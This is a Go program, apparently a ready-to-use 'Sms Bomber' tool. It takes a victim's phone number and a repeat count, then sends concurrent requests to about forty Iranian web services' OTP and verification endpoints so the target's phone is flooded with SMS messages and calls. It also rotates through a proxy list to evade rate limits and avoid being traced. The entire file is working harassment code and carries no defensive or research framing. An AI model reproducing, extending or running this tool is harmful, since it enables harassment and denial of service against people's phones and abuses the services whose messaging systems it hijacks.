package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, client *http.Client, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m", err)
		ch <- 500
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- 500
		return
	}
	req.Header.Set("Content-Type", "application/json")

	// Use the provided client
	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0
			return
		}
		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)

        if resp != nil {
             bodyBytes, readErr := io.ReadAll(resp.Body)
             if readErr != nil {
                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
             } else {
                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
             }
        }

		ch <- 500
		return
	}
	defer resp.Body.Close()

	statusCode := resp.StatusCode
	ch <- statusCode

	if statusCode >= 200 && statusCode < 400 {

    } else {
         bodyBytes, readErr := io.ReadAll(resp.Body)
         if readErr != nil {
             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
         } else {
             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
         }
    }
}

func sendFormRequest(ctx context.Context, client *http.Client, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- 500
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Use the provided client
	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0
			return
		}
		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)

        if resp != nil {
             bodyBytes, readErr := io.ReadAll(resp.Body)
             if readErr != nil {
                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
             } else {
                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
             }
        }

		ch <- 500
		return
	}
	defer resp.Body.Close()

	statusCode := resp.StatusCode
	ch <- statusCode

	if statusCode >= 200 && statusCode < 400 {
    } else {
         bodyBytes, readErr := io.ReadAll(resp.Body)
         if readErr != nil {
             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
         } else {
             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
         }
    }
}


var proxyList []string

var proxyIndex int
var proxyMutex sync.Mutex

func loadProxyListFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("error opening proxy file %s: %w", filename, err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading proxy file %s: %w", filename, err)
	}

	return proxies, nil
}


func dialContextWithProxyPool(ctx context.Context, network, addr string) (net.Conn, error) {
    proxyMutex.Lock()
    defer proxyMutex.Unlock()

    if len(proxyList) == 0 {
        var d net.Dialer
        return d.DialContext(ctx, network, addr)
    }

    proxyURLStr := proxyList[proxyIndex]
    proxyIndex = (proxyIndex + 1) % len(proxyList)

    proxyURL, err := url.Parse(proxyURLStr)
    if err != nil {
        fmt.Printf("\033[01;31m[-] Error parsing proxy URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr)
    }

    var forward proxy.Dialer
    switch proxyURL.Scheme {
    case "http", "https":
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
    case "socks5", "socks4", "socks":
        forward, err = proxy.FromURL(proxyURL, proxy.Direct)
    default:
         fmt.Printf("\033[01;31m[-] Unsupported proxy scheme '%s' for URL '%s'. Connecting directly.\033[0m\n", proxyURL.Scheme, proxyURLStr, err)
         var d net.Dialer
         return d.DialContext(ctx, network, addr)
    }

    if err != nil {
        fmt.Printf("\033[01;31m[-] Error creating proxy dialer for URL '%s': %v. Connecting directly.\033[0m\n", proxyURLStr, err)
        var d net.Dialer
        return d.DialContext(ctx, network, addr)
    }

    return forward.DialContext(ctx, network, addr)
}


func main() {
	clearScreen()

fmt.Print("\033[01;32m")
	fmt.Print(`
                                 :-.
                          .:  =#-:-----:
                            **%@#%@@@#*+==:
                        :=*%@@@@@@@@@@@@@@%#*=:
                     -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
                 . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
               .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
              =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
             :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
             #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
            .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
            =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
            +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
            =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
            .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
             -@@@@*:        . -#@@@@@@#: .        -#@@@%:
              *@@%#            -@@@@@@.           #@@@+
              .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
               :@@*           =%@@@@@@%-   faster   *@@:
               #@@%          .*@@@@#%@@@%+.        %@@+
               %@@@+      -#@@@@@* :%@@@@@*-     *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
               *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
                #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
                 =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
                   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
                       #@@@@@@@@@@@@@@@@@@@@@@+
                        *@@@@@@@@@@@@@@@@@@@@+
                         +@@%*@@%@@@%%@%*@@%=
                          +%+ %%.+@%:-@* *%-
                           . %# .%# %+
                             :. %+ :.
                               -:
`)
	fmt.Print("\033[0m")


    fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnable proxy? (on/off): \033[00;36m")
    var proxyChoice string
    fmt.Scan(&proxyChoice)

    var client *http.Client
    var tr *http.Transport

    if strings.ToLower(proxyChoice) == "on" {
        fmt.Println("\033[01;32m[+] Proxy enabled. Initializing connections...\033[0m\n")

        proxies, err := loadProxyListFromFile("proxies.txt")
        if err != nil {
            fmt.Printf("\033[01;31m[-] Error loading proxies from file: %v. Proceeding without proxy.\033[0m\n\n", err)
            tr = &http.Transport{}
            client = &http.Client{Transport: tr}
        } else if len(proxies) == 0 {
             fmt.Println("\033[01;31m[-] Proxy list file found but is empty. Proceeding without proxy.\033[0m\n\n")
             tr = &http.Transport{}
             client = &http.Client{Transport: tr}
        } else {
            proxyList = proxies
            tr = &http.Transport{
                DialContext: dialContextWithProxyPool,
                DisableKeepAlives: true,
                TLSHandshakeTimeout: 10 * time.Second,
                ResponseHeaderTimeout: 10 * time.Second,
            }
             client = &http.Client{Transport: tr}

            fmt.Printf("\033[01;32m[+] %d proxies loaded and configured.\033[0m\n\n", len(proxyList))
        }

    } else {
        fmt.Println("\033[01;31m[-] Proxy disabled. Proceeding with direct connection.\033[0m\n\n")
        tr = &http.Transport{}
        client = &http.Client{Transport: tr}
    }

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

    ctx, cancel := context.WithCancel(context.Background())
    signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m\n")
		cancel()
	}()

	var wg sync.WaitGroup
	ch := make(chan int, repeatCount*40)


	for i := 0; i < repeatCount; i++ {

        wg.Add(1)
		go sendJSONRequest(ctx, client, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			"PhoneNo": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			"mobile": phone,
			"country_code": "+98",
		}, &wg, ch)

		 wg.Add(1)
		 go func(cl *http.Client, p string) {
		 	sendJSONRequest(ctx, cl, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
		 }(client, phone)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.ostadkr.com/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
			"mobileNumber": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		 wg.Add(1)
		 go func(cl *http.Client, p string) {
		 	formData := url.Values{}
		 	formData.Set("cellphone", p)
		 	sendFormRequest(ctx, cl, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		 }(client, phone)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
			"device_type": 2,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://caropex.com/api/v1/user/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, client, "https://api.tandori.ir/client/users/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)


	}

go func() {
		wg.Wait()
		close(ch)
	}()

    fmt.Println("\033[01;33m--- Summary --- \033[0m\n")
    successCount := 0
    errorCount := 0
    canceledCount := 0

    for statusCode := range ch {
        if statusCode >= 200 && statusCode < 400 {
            successCount++
        } else if statusCode == 0 {
             canceledCount++
             errorCount++
        } else {
            errorCount++
        }
    }

    fmt.Printf("\033[01;32m[+] Successful requests: %d\033[0m\n", successCount)
    fmt.Printf("\033[01;31m[-] Failed requests: %d\033[0m\n", errorCount)
    fmt.Printf("\033[01;33m[!] Canceled requests: %d\033[0m\n", canceledCount)
    fmt.Println("\033[0m")

} 
